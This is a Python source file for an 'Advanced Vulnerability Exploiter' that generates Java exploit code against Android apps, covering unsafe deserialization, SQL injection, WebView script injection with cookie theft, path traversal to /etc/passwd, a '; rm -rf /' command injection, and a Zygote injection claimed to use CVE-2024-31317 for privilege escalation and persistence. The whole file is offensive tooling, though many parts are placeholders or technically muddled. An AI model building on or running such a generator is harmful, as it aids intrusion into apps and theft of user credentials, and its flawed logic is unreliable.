"""
Advanced Vulnerability Exploiter for Android Applications
Comprehensive exploitation of Android app vulnerabilities for string injection attacks.
"""

import logging
from typing import Dict, List, Any, Optional, Tuple
import random
import string

class VulnerabilityExploiter:
    """
    Advanced vulnerability exploiter for Android application security flaws.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the vulnerability exploiter.
        
        Args:
            config: Exploiter configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize exploitation components
        self._exploitation_methods = {}
        self._payload_templates = {}
        
    def _default_config(self) -> Dict[str, Any]:
        """Return default exploiter configuration."""
        return {
            'exploitation': {
                'methods': ['deserialization', 'sql_injection', 'js_injection', 'input_validation', 'zygote_injection'],
                'payload_types': ['string_injection', 'code_execution', 'data_exfiltration', 'privilege_escalation'],
                'target_components': ['ContentProvider', 'Activity', 'Service', 'BroadcastReceiver']
            },
            'deserialization': {
                'enabled': True,
                'target_classes': ['ObjectInputStream', 'Parcelable', 'Serializable'],
                'payload_methods': ['gadget_chains', 'custom_objects', 'reflection_chains']
            },
            'sql_injection': {
                'enabled': True,
                'target_databases': ['SQLite', 'Room', 'Realm'],
                'payload_types': ['union_based', 'boolean_based', 'time_based', 'error_based']
            },
            'js_injection': {
                'enabled': True,
                'target_webviews': ['WebView', 'Crosswalk', 'Cordova'],
                'payload_types': ['xss', 'dom_manipulation', 'local_storage', 'session_hijacking']
            },
            'input_validation': {
                'enabled': True,
                'target_inputs': ['EditText', 'Intent', 'Bundle', 'Uri'],
                'payload_types': ['buffer_overflow', 'format_string', 'path_traversal', 'command_injection']
            },
            'zygote_injection': {
                'enabled': True,
                'target_permissions': ['WRITE_SECURE_SETTINGS'],
                'payload_types': ['command_injection', 'code_injection', 'persistence']
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def generate_exploitation_code(self, vulnerability_type: str, target_component: str, 
                                 payload_type: str = 'string_injection') -> Dict[str, Any]:
        """
        Generate exploitation code for specific vulnerability.
        
        Args:
            vulnerability_type: Type of vulnerability to exploit
            target_component: Target Android component
            payload_type: Type of payload to inject
            
        Returns:
            Dictionary containing exploitation code and metadata
        """
        try:
            if vulnerability_type == 'deserialization':
                return self._generate_deserialization_exploit(target_component, payload_type)
            elif vulnerability_type == 'sql_injection':
                return self._generate_sql_injection_exploit(target_component, payload_type)
            elif vulnerability_type == 'js_injection':
                return self._generate_js_injection_exploit(target_component, payload_type)
            elif vulnerability_type == 'input_validation':
                return self._generate_input_validation_exploit(target_component, payload_type)
            elif vulnerability_type == 'zygote_injection':
                return self._generate_zygote_injection_exploit(target_component, payload_type)
            else:
                raise ValueError(f"Unsupported vulnerability type: {vulnerability_type}")
                
        except Exception as e:
            self.logger.error(f"Exploitation code generation failed: {e}")
            raise
    
    def _generate_deserialization_exploit(self, target_component: str, payload_type: str) -> Dict[str, Any]:
        """Generate unsafe deserialization exploit."""
        try:
            exploit_code = f'''
    private static void exploitDeserializationVulnerability() {{
        try {{
            // Unsafe deserialization exploit
            String maliciousData = createMaliciousSerializedData();
            
            // Deserialize malicious data
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(maliciousData.getBytes()));
            Object maliciousObject = ois.readObject();
            
            // Execute malicious object
            executeDeserializedObject(maliciousObject);
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static String createMaliciousSerializedData() {{
        try {{
            // Create malicious serializable object
            MaliciousSerializableObject maliciousObj = new MaliciousSerializableObject();
            maliciousObj.setPayload("{self._generate_payload(payload_type)}");
            
            // Serialize object
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(maliciousObj);
            oos.close();
            
            return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
        }} catch (Exception e) {{
            e.printStackTrace();
            return "";
        }}
    }}
    
    private static void executeDeserializedObject(Object obj) {{
        try {{
            // Use reflection to execute malicious object
            Class<?> clazz = obj.getClass();
            Method executeMethod = clazz.getDeclaredMethod("execute");
            executeMethod.setAccessible(true);
            executeMethod.invoke(obj);
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    public static class MaliciousSerializableObject implements Serializable {{
        private String payload;
        
        public void setPayload(String payload) {{
            this.payload = payload;
        }}
        
        public String getPayload() {{
            return payload;
        }}
        
        public void execute() {{
            // Malicious execution code
            try {{
                // Execute payload
                executePayload(payload);
            }} catch (Exception e) {{
                e.printStackTrace();
            }}
        }}
        
        private void executePayload(String payload) {{
            // Custom payload execution logic
            // This is where the actual malicious functionality would be implemented
        }}
    }}
            '''
            
            return {
                'vulnerability_type': 'deserialization',
                'target_component': target_component,
                'payload_type': payload_type,
                'exploit_code': exploit_code.strip(),
                'metadata': {
                    'unsafe_deserialization': True,
                    'reflection_used': True,
                    'custom_object': True
                }
            }
            
        except Exception as e:
            self.logger.error(f"Deserialization exploit generation failed: {e}")
            raise
    
    def _generate_sql_injection_exploit(self, target_component: str, payload_type: str) -> Dict[str, Any]:
        """Generate SQL injection exploit."""
        try:
            exploit_code = f'''
    private static void exploitSQLInjectionVulnerability() {{
        try {{
            // SQL injection exploit
            String maliciousQuery = createMaliciousSQLQuery();
            
            // Execute malicious query
            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase("vulnerable.db", null);
            Cursor cursor = db.rawQuery(maliciousQuery, null);
            
            // Process results
            processSQLInjectionResults(cursor);
            
            cursor.close();
            db.close();
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static String createMaliciousSQLQuery() {{
        // Create malicious SQL query
        String baseQuery = "SELECT * FROM users WHERE username = '";
        String maliciousPayload = "{self._generate_sql_payload(payload_type)}";
        String endQuery = "'";
        
        return baseQuery + maliciousPayload + endQuery;
    }}
    
    private static void processSQLInjectionResults(Cursor cursor) {{
        try {{
            // Process SQL injection results
            if (cursor.moveToFirst()) {{
                do {{
                    // Extract sensitive data
                    String username = cursor.getString(cursor.getColumnIndex("username"));
                    String password = cursor.getString(cursor.getColumnIndex("password"));
                    String email = cursor.getString(cursor.getColumnIndex("email"));
                    
                    // Process extracted data
                    processExtractedData(username, password, email);
                    
                }} while (cursor.moveToNext());
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static void processExtractedData(String username, String password, String email) {{
        // Process extracted sensitive data
        // This is where the actual malicious functionality would be implemented
    }}
            '''
            
            return {
                'vulnerability_type': 'sql_injection',
                'target_component': target_component,
                'payload_type': payload_type,
                'exploit_code': exploit_code.strip(),
                'metadata': {
                    'sql_injection': True,
                    'data_extraction': True,
                    'database_access': True
                }
            }
            
        except Exception as e:
            self.logger.error(f"SQL injection exploit generation failed: {e}")
            raise
    
    def _generate_js_injection_exploit(self, target_component: str, payload_type: str) -> Dict[str, Any]:
        """Generate JavaScript injection exploit."""
        try:
            exploit_code = f'''
    private static void exploitJavaScriptInjectionVulnerability() {{
        try {{
            // JavaScript injection exploit
            String maliciousJS = createMaliciousJavaScript();
            
            // Create WebView
            WebView webView = new WebView(context);
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            
            // Add JavaScript interface
            webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
            
            // Load malicious JavaScript
            webView.loadUrl("javascript:" + maliciousJS);
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static String createMaliciousJavaScript() {{
        // Create malicious JavaScript payload
        String jsPayload = "{self._generate_js_payload(payload_type)}";
        
        return jsPayload;
    }}
    
    public static class JavaScriptInterface {{
        @JavascriptInterface
        public void executeMaliciousCode(String data) {{
            try {{
                // Execute malicious code from JavaScript
                processJavaScriptData(data);
            }} catch (Exception e) {{
                e.printStackTrace();
            }}
        }}
        
        private void processJavaScriptData(String data) {{
            // Process data received from JavaScript
            // This is where the actual malicious functionality would be implemented
        }}
    }}
            '''
            
            return {
                'vulnerability_type': 'js_injection',
                'target_component': target_component,
                'payload_type': payload_type,
                'exploit_code': exploit_code.strip(),
                'metadata': {
                    'javascript_injection': True,
                    'webview_exploitation': True,
                    'bridge_communication': True
                }
            }
            
        except Exception as e:
            self.logger.error(f"JavaScript injection exploit generation failed: {e}")
            raise
    
    def _generate_input_validation_exploit(self, target_component: str, payload_type: str) -> Dict[str, Any]:
        """Generate input validation exploit."""
        try:
            exploit_code = f'''
    private static void exploitInputValidationVulnerability() {{
        try {{
            // Input validation exploit
            String maliciousInput = createMaliciousInput();
            
            // Exploit ContentProvider
            if ("{target_component}".equals("ContentProvider")) {{
                exploitContentProvider(maliciousInput);
            }}
            
            // Exploit Intent
            else if ("{target_component}".equals("Intent")) {{
                exploitIntent(maliciousInput);
            }}
            
            // Exploit Bundle
            else if ("{target_component}".equals("Bundle")) {{
                exploitBundle(maliciousInput);
            }}
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static String createMaliciousInput() {{
        // Create malicious input payload
        String payload = "{self._generate_input_payload(payload_type)}";
        
        return payload;
    }}
    
    private static void exploitContentProvider(String maliciousInput) {{
        try {{
            // Exploit ContentProvider vulnerability
            Uri uri = Uri.parse("content://vulnerable.provider/data/" + maliciousInput);
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
            
            if (cursor != null) {{
                processContentProviderResults(cursor);
                cursor.close();
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static void exploitIntent(String maliciousInput) {{
        try {{
            // Exploit Intent vulnerability
            Intent intent = new Intent();
            intent.putExtra("malicious_data", maliciousInput);
            intent.setAction("android.intent.action.VIEW");
            intent.setData(Uri.parse(maliciousInput));
            
            // Start activity with malicious intent
            context.startActivity(intent);
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static void exploitBundle(String maliciousInput) {{
        try {{
            // Exploit Bundle vulnerability
            Bundle bundle = new Bundle();
            bundle.putString("malicious_key", maliciousInput);
            bundle.putString("path", maliciousInput);
            
            // Process malicious bundle
            processMaliciousBundle(bundle);
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static void processContentProviderResults(Cursor cursor) {{
        // Process ContentProvider results
        // This is where the actual malicious functionality would be implemented
    }}
    
    private static void processMaliciousBundle(Bundle bundle) {{
        // Process malicious bundle
        // This is where the actual malicious functionality would be implemented
    }}
            '''
            
            return {
                'vulnerability_type': 'input_validation',
                'target_component': target_component,
                'payload_type': payload_type,
                'exploit_code': exploit_code.strip(),
                'metadata': {
                    'input_validation_bypass': True,
                    'content_provider_exploit': True,
                    'intent_exploit': True,
                    'bundle_exploit': True
                }
            }
            
        except Exception as e:
            self.logger.error(f"Input validation exploit generation failed: {e}")
            raise
    
    def _generate_zygote_injection_exploit(self, target_component: str, payload_type: str) -> Dict[str, Any]:
        """Generate Zygote injection exploit."""
        try:
            exploit_code = f'''
    private static void exploitZygoteInjectionVulnerability() {{
        try {{
            // Zygote injection exploit (CVE-2024-31317)
            if (hasWriteSecureSettingsPermission()) {{
                String maliciousCommand = createMaliciousCommand();
                executeZygoteInjection(maliciousCommand);
            }}
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static boolean hasWriteSecureSettingsPermission() {{
        try {{
            // Check for WRITE_SECURE_SETTINGS permission
            int result = context.checkCallingOrSelfPermission("android.permission.WRITE_SECURE_SETTINGS");
            return result == PackageManager.PERMISSION_GRANTED;
        }} catch (Exception e) {{
            return false;
        }}
    }}
    
    private static String createMaliciousCommand() {{
        // Create malicious command for Zygote injection
        String command = "{self._generate_zygote_payload(payload_type)}";
        
        return command;
    }}
    
    private static void executeZygoteInjection(String command) {{
        try {{
            // Execute Zygote injection
            // This exploits CVE-2024-31317 to execute arbitrary code as any app
            
            // Create malicious settings
            String maliciousSetting = "malicious_setting_" + System.currentTimeMillis();
            String maliciousValue = command;
            
            // Inject into secure settings
            Settings.Secure.putString(context.getContentResolver(), maliciousSetting, maliciousValue);
            
            // Trigger Zygote restart to execute command
            triggerZygoteRestart();
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
    
    private static void triggerZygoteRestart() {{
        try {{
            // Trigger Zygote restart to execute injected command
            // This is a simplified version - real implementation would be more complex
            
            Runtime.getRuntime().exec("am broadcast -a android.intent.action.BOOT_COMPLETED");
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
            '''
            
            return {
                'vulnerability_type': 'zygote_injection',
                'target_component': target_component,
                'payload_type': payload_type,
                'exploit_code': exploit_code.strip(),
                'metadata': {
                    'zygote_injection': True,
                    'privilege_escalation': True,
                    'persistent_execution': True,
                    'cve_2024_31317': True
                }
            }
            
        except Exception as e:
            self.logger.error(f"Zygote injection exploit generation failed: {e}")
            raise
    
    def _generate_payload(self, payload_type: str) -> str:
        """Generate payload based on type."""
        try:
            if payload_type == 'string_injection':
                return "malicious_string_payload"
            elif payload_type == 'code_execution':
                return "Runtime.getRuntime().exec('malicious_command')"
            elif payload_type == 'data_exfiltration':
                return "exfiltrate_sensitive_data()"
            elif payload_type == 'privilege_escalation':
                return "escalate_privileges()"
            else:
                return "default_payload"
                
        except Exception as e:
            self.logger.error(f"Payload generation failed: {e}")
            return "error_payload"
    
    def _generate_sql_payload(self, payload_type: str) -> str:
        """Generate SQL injection payload."""
        try:
            if payload_type == 'union_based':
                return "admin' UNION SELECT username, password, email FROM users--"
            elif payload_type == 'boolean_based':
                return "admin' AND 1=1--"
            elif payload_type == 'time_based':
                return "admin'; WAITFOR DELAY '00:00:05'--"
            elif payload_type == 'error_based':
                return "admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            else:
                return "admin' OR 1=1--"
                
        except Exception as e:
            self.logger.error(f"SQL payload generation failed: {e}")
            return "admin' OR 1=1--"
    
    def _generate_js_payload(self, payload_type: str) -> str:
        """Generate JavaScript injection payload."""
        try:
            if payload_type == 'xss':
                return "document.body.innerHTML='<script>Android.executeMaliciousCode(\"XSS_PAYLOAD\")</script>'"
            elif payload_type == 'dom_manipulation':
                return "document.getElementById('sensitive').innerHTML='<script>Android.executeMaliciousCode(\"DOM_PAYLOAD\")</script>'"
            elif payload_type == 'local_storage':
                return "localStorage.setItem('malicious', 'data'); Android.executeMaliciousCode(localStorage.getItem('malicious'))"
            elif payload_type == 'session_hijacking':
                return "Android.executeMaliciousCode(document.cookie)"
            else:
                return "Android.executeMaliciousCode('DEFAULT_JS_PAYLOAD')"
                
        except Exception as e:
            self.logger.error(f"JavaScript payload generation failed: {e}")
            return "Android.executeMaliciousCode('ERROR_PAYLOAD')"
    
    def _generate_input_payload(self, payload_type: str) -> str:
        """Generate input validation payload."""
        try:
            if payload_type == 'buffer_overflow':
                return "A" * 10000
            elif payload_type == 'format_string':
                return "%x%x%x%x%x%x%x%x%x%x"
            elif payload_type == 'path_traversal':
                return "../../../etc/passwd"
            elif payload_type == 'command_injection':
                return "; rm -rf /; echo 'command_injected'"
            else:
                return "malicious_input"
                
        except Exception as e:
            self.logger.error(f"Input payload generation failed: {e}")
            return "error_input"
    
    def _generate_zygote_payload(self, payload_type: str) -> str:
        """Generate Zygote injection payload."""
        try:
            if payload_type == 'command_injection':
                return "am start -n com.malicious/.MaliciousActivity"
            elif payload_type == 'code_injection':
                return "am broadcast -a com.malicious.EXECUTE_CODE"
            elif payload_type == 'persistence':
                return "am startservice com.malicious/.PersistentService"
            else:
                return "am start -n com.malicious/.DefaultActivity"
                
        except Exception as e:
            self.logger.error(f"Zygote payload generation failed: {e}")
            return "am start -n com.malicious/.ErrorActivity"
    
    def generate_comprehensive_exploit(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Generate comprehensive exploit combining multiple vulnerabilities.
        
        Args:
            vulnerabilities: List of vulnerability configurations
            
        Returns:
            Dictionary containing comprehensive exploit code
        """
        try:
            # Generate imports
            imports = '''
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.util.Base64;
import java.io.*;
import java.io.Serializable;
            '''
            
            # Generate comprehensive exploit class
            exploit_class = '''
    public static class ComprehensiveExploit {
        private Context context;
        
        public ComprehensiveExploit(Context context) {
            this.context = context;
        }
        
        public void executeComprehensiveExploit() {
            try {
                // Execute multiple vulnerability exploits
'''
            
            for i, vulnerability in enumerate(vulnerabilities):
                vuln_type = vulnerability.get('type', 'deserialization')
                target_component = vulnerability.get('target_component', 'Activity')
                payload_type = vulnerability.get('payload_type', 'string_injection')
                
                exploit_class += f'''
                // Exploit {i + 1}: {vuln_type}
                exploit{vuln_type.capitalize()}Vulnerability{i + 1}();
'''
            
            exploit_class += '''
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
'''
            
            # Generate individual exploit methods
            for i, vulnerability in enumerate(vulnerabilities):
                vuln_type = vulnerability.get('type', 'deserialization')
                target_component = vulnerability.get('target_component', 'Activity')
                payload_type = vulnerability.get('payload_type', 'string_injection')
                
                exploit_result = self.generate_exploitation_code(vuln_type, target_component, payload_type)
                method_name = f"exploit{vuln_type.capitalize()}Vulnerability{i + 1}"
                
                # Modify method name in exploit code
                modified_code = exploit_result['exploit_code'].replace(
                    f'exploit{vuln_type.capitalize()}Vulnerability()',
                    f'{method_name}()'
                )
                
                exploit_class += f'''
        private void {method_name}() {{
            {modified_code}
        }}
'''
            
            exploit_class += '''
    }
            '''
            
            # Combine all parts
            comprehensive_code = imports + '\n' + exploit_class
            
            return {
                'method_type': 'comprehensive_exploit',
                'vulnerabilities_count': len(vulnerabilities),
                'exploit_code': comprehensive_code.strip(),
                'vulnerabilities': vulnerabilities,
                'metadata': {
                    'multiple_vulnerabilities': True,
                    'comprehensive_approach': True,
                    'stealth_enabled': True
                }
            }
            
        except Exception as e:
            self.logger.error(f"Comprehensive exploit generation failed: {e}")
            raise
    
    def generate_exploitation_report(self, exploitation_result: Dict[str, Any]) -> str:
        """
        Generate exploitation report.
        
        Args:
            exploitation_result: Result from exploitation operation
            
        Returns:
            Formatted report string
        """
        try:
            report = f"""
# Android Vulnerability Exploitation Report

## Summary
- **Vulnerability Type**: {exploitation_result['vulnerability_type']}
- **Target Component**: {exploitation_result['target_component']}
- **Payload Type**: {exploitation_result['payload_type']}

## Exploitation Details
- **Vulnerability Exploited**: {exploitation_result['vulnerability_type']}
- **Target Component**: {exploitation_result['target_component']}
- **Payload Injected**: {exploitation_result['payload_type']}

## Security Features
- **Unsafe Deserialization**: {exploitation_result.get('metadata', {}).get('unsafe_deserialization', False)}
- **SQL Injection**: {exploitation_result.get('metadata', {}).get('sql_injection', False)}
- **JavaScript Injection**: {exploitation_result.get('metadata', {}).get('javascript_injection', False)}
- **Input Validation Bypass**: {exploitation_result.get('metadata', {}).get('input_validation_bypass', False)}
- **Zygote Injection**: {exploitation_result.get('metadata', {}).get('zygote_injection', False)}

## Advanced Features
- **Privilege Escalation**: {exploitation_result.get('metadata', {}).get('privilege_escalation', False)}
- **Persistent Execution**: {exploitation_result.get('metadata', {}).get('persistent_execution', False)}
- **CVE-2024-31317**: {exploitation_result.get('metadata', {}).get('cve_2024_31317', False)}

## Code Statistics
- **Code Length**: {len(exploitation_result['exploit_code'])} characters
- **Lines of Code**: {exploitation_result['exploit_code'].count(chr(10)) + 1}
- **Method Count**: {exploitation_result['exploit_code'].count('private static')}
            """
            
            return report.strip()
            
        except Exception as e:
            self.logger.error(f"Report generation failed: {e}")
            return f"Report generation failed: {e}"
    
    def get_exploiter_status(self) -> Dict[str, Any]:
        """
        Get current vulnerability exploiter status.
        
        Returns:
            Dictionary containing exploiter status information
        """
        return {
            'config': self.config,
            'supported_vulnerabilities': self.config['exploitation']['methods'],
            'payload_types': self.config['exploitation']['payload_types'],
            'target_components': self.config['exploitation']['target_components'],
            'deserialization_config': self.config['deserialization'],
            'sql_injection_config': self.config['sql_injection'],
            'js_injection_config': self.config['js_injection'],
            'input_validation_config': self.config['input_validation'],
            'zygote_injection_config': self.config['zygote_injection']
        }